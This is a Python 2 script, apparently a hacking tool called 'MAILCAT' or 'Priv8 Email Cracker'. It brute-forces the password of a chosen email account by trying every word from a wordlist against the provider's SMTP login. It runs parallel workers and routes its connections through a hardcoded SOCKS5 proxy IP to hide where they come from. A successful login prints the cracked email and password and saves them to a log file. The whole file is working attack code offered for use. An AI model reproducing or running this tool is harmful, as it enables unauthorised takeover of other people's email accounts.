###############################################################################
# netcat[dot]av[at]gmail[dot]com
# #!/usr/bin/python
###############################################################################

import sys
from smtplib import SMTP
import smtplib
import multiprocessing
import time
import socks

print "\n"
print " __  __    _    ___ _     ____    _  _____ "
print "|  \/  |  / \  |_ _| |   / ___|  / \|_   _|"
print "| |\/| | / _ \  | || |  | |     / _ \ | |  "
print "| |  | |/ ___ \ | || |__| |___ / ___ \| |  "
print "|_|  |_/_/   \_\___|_____\____/_/   \_\_|  v1.1"




VERBOSE = 0
LOG = ""

if len(sys.argv) not in [4,5,6,7]:
	print "\nUsage: ./mailcat.py <target> <wordlist> <workers> <options>\n"
	print "\t   -o/-outlog <file> : Output Logfile"
	print "\t   -v/-verbose : Verbose Mode\n"
	sys.exit(1)
	
for arg in sys.argv[1:]:
	if arg.lower() == "-o" or arg.lower() == "-outlog":
		LOG = sys.argv[sys.argv[1:].index(arg)+2]
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		VERBOSE = 1

MAIL = sys.argv[1]
ID, separator, SERVICE = MAIL.rpartition('@')
THREAD = int(sys.argv[3])



try:
  words = open(sys.argv[2], "r").readlines()    	
except(IOError):
  print "[-] Error: Check your wordlist path\n"
  sys.exit(1)


print "\n***************************************"
print "* Priv8 Email Cracker                 *"
print "* Coded by N3TC@T                     *"
print "* netcat[dot]av[at]gmail[dot]com      *"
print "***************************************\n"
print "[+] Target  Loaded:",MAIL
print "[+] Service Loaded:",SERVICE.upper()
print "[+] Words   Loaded:",len(words) , "\n"

def smtp_servers(service):
  if (service == "gmail.com"):
    return "smtp.gmail.com:587"
  elif (service == "hotmail.com" or service == "msn.com" or service == "outlook.com"):
    return "smtp-mail.outlook.com:587"
  elif (service == "yahoo.com"):
    return "smtp.mail.yahoo.com:587"
  elif (service == "aol.com" ):
    return "smtp.aol.com:587"
  else:
    print "[!] Sorry SMTP Settings NOT Found !"
    return False

def check_server(SERVER):
  try:
   status , response = SMTP(SERVER).noop()
   if (status == 250 ):
     return True
   else:
     return False
  except :
    return False

def out_log(PATH,CONTENT):
  file = open(PATH, "w")
  file.write(CONTENT)
  file.close()

if(smtp_servers(SERVICE) != False ):
  SMTP_SERVER = smtp_servers(SERVICE)
else:
  answer = raw_input("[-] Use smtp." + SERVICE + ":587 Setting?(y/n) : " )
  if ( answer == "y" ) :
    SMTP_SERVER = "smtp." + SERVICE + ":587"
  else :
    custom_smtp = raw_input("[-] Please Enter Custom SMTP Setting , ex smtp.test.com:587 : " )
    SMTP_SERVER = custom_smtp

if (check_server(SMTP_SERVER) != True ):
  print "\n[!] SMTP Server " + SMTP_SERVER +  " Now Is Offline ! Please Try Again Latter ."
  sys.exit(1)

def check_encrypt(SERVER):
  IP, separator, PORT = SERVER.rpartition(':')
  if(PORT == "465"):
    return 0
  elif ( PORT == "587" ):
    return 1
  else:
    return 0

TTLS_ENCRYPTION = check_encrypt(SMTP_SERVER)
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '121.218.42.173', '23218')
socks.wrapmodule(smtplib)

def brute(word,event):
  try:
    smtp = SMTP(SMTP_SERVER)
    smtp.set_debuglevel(1)
    smtp.ehlo(SMTP_SERVER)
    if(TTLS_ENCRYPTION == 1 ):
      smtp.starttls()
      smtp.ehlo(SMTP_SERVER)
    word = word.replace("\r","").replace("\n","")
    if(VERBOSE==1):
      print "[*] Trying " , word

    status,response=(smtp.login(MAIL,word))
    if (status == 235):
      print "\n[!]Successful Login:"
      print "***************************************"
      print "[!] Email: " , MAIL
      print "[!] Password: " , word
      print "***************************************\n"

      print "[!] Brute Complete"

      CONTENT = "Cracked Emails : \n\nEmail: " + MAIL + "\nPassword: " + word
      if(LOG != "" ):
	out_log(LOG,CONTENT)
	print "[+] Log File Saved to: " , LOG , "\n"
      event.set()
      sys.exit()

    smtp.quit()
    time.sleep(2)
  except smtplib.SMTPAuthenticationError :
    smtp.quit()
  except smtplib.socket.gaierror:
    print "socet error"
    pass



def starter():
  print "[!] Initializing Workers"
  print "[!] Start Cracking ... \n"
  p=multiprocessing.Pool(THREAD)
  m = multiprocessing.Manager()
  event = m.Event()

  for word in words:
    p.apply_async(brute , (word,event) )

  event.wait()
  sys.exit()

  try:
    time.sleep(10)

  except  (KeyboardInterrupt , SystemExit) :
    print "Caught KeyboardInterrupt, terminating workers"
    p.terminate()
    p.join()
  except :
    pass
  else:
    p.close()
    p.join()


if __name__ == "__main__":
  starter()
